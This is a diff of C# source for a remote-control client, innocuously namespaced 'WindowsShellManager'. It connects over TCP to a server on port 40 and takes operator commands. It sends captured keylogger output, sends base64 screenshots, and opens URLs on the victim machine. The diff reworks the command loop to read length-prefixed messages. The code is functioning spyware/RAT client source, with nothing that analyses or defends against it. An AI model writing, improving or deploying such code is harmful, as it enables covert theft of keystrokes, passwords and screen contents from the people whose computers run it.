@@ -15,62 +15,57 @@ namespace WindowsShellManager
         {
             while (true)
             {
-                int packetSize = 256;
                 try
                 {
                     Int32 port = 40;
                     TcpClient client = new TcpClient(server, port);
-
-                    Byte[] data = Encoding.ASCII.GetBytes("CONNECT");
                     NetworkStream stream = client.GetStream();
-                    SendData(stream, data);
 
+                    Byte[] connect = Encoding.ASCII.GetBytes("CONNECT");
+                    SendData(stream, connect);
 
-                    while (true)
+                    byte[] datalength = new byte[4];
+
+                    int i;
+                    while ((i = stream.Read(datalength, 0, 4)) != 0)
                     {
-                        try
+                        int dataLength = BitConverter.ToInt32(datalength, 0);
+                        byte[] data = new byte[dataLength];
+
+                        int bytesReceived = 0;
+                        while (bytesReceived < data.Length)
                         {
-
-                            data = new Byte[packetSize];
-                            String responseData = String.Empty;
-                            Int32 bytes = stream.Read(data, 0, data.Length);
-
-
-
-
-                            responseData = Encoding.ASCII.GetString(data, 0, bytes);
-                            Console.WriteLine("Received: {0}", responseData);
-                            if (responseData.ToUpper() == "SENDKCAPTURE")
-                            {
-                                Console.WriteLine("Sending Data...");
-                                data = new Byte[packetSize];
-                                data = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
-                                features.KeyLogger.KeyLog = String.Empty;
-                                SendData(stream, data);
-                            }
-                            else if (responseData.ToUpper() == "SCREENSHOT")
-                            {
-                                Image bmp = new features.ScreenCapture().CaptureScreen();
-                                data = new Byte[packetSize];
-                                string image = Helpers.helper.ImageToBase64(bmp);
-                                data = Encoding.ASCII.GetBytes("IMAGE" + image);
-                                SendData(stream, data);
-                                bmp.Dispose();
-                            }
-                            else if (responseData.ToUpper().StartsWith("OPENSITE"))
-                            {
-                                string[] command = responseData.Split('|');
-                                System.Diagnostics.Process.Start("http://" + command[1]);
-                            }
-                            else if (responseData.ToUpper() == "DISCONNECT")
-                            {
-                                stream.Close();
-                                client.Close();
-                                break;
-                            }
+                            bytesReceived += stream.Read(data, bytesReceived, data.Length - bytesReceived);
                         }
-                        catch (System.IO.IOException)
+
+                        String decodedData = System.Text.Encoding.ASCII.GetString(data, 0, dataLength);
+
+                        Console.WriteLine("Received: {0}", decodedData);
+                        if (decodedData.ToUpper() == "SENDKCAPTURE")
                         {
+                            Console.WriteLine("Sending Data...");
+
+                            byte[] msg = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
+                            features.KeyLogger.KeyLog = String.Empty;
+                            SendData(stream, msg);
+                        }
+                        else if (decodedData.ToUpper() == "SCREENSHOT")
+                        {
+                            Image bmp = new features.ScreenCapture().CaptureScreen();
+                            string image = Helpers.helper.ImageToBase64(bmp);
+                            byte[] msg = Encoding.ASCII.GetBytes("IMAGE" + image);
+                            SendData(stream, msg);
+                            bmp.Dispose();
+                        }
+                        else if (decodedData.ToUpper().StartsWith("OPENSITE"))
+                        {
+                            string[] command = decodedData.Split('|');
+                            System.Diagnostics.Process.Start("http://" + command[1]);
+                        }
+                        else if (decodedData.ToUpper() == "DISCONNECT")
+                        {
+                            stream.Close();
+                            client.Close();
                             break;
                         }
                     }
@@ -87,9 +82,12 @@ namespace WindowsShellManager
                 {
                     Console.WriteLine("FileNotFoundException: {0}", e);
                 }
+                catch (System.IO.IOException e)
+                {
+                    Console.WriteLine("IOException: {0}", e);
+                }
             }
         }
-
         void SendData(NetworkStream stream, byte[] data)
         {
             byte[] dataLength = BitConverter.GetBytes(data.Length);
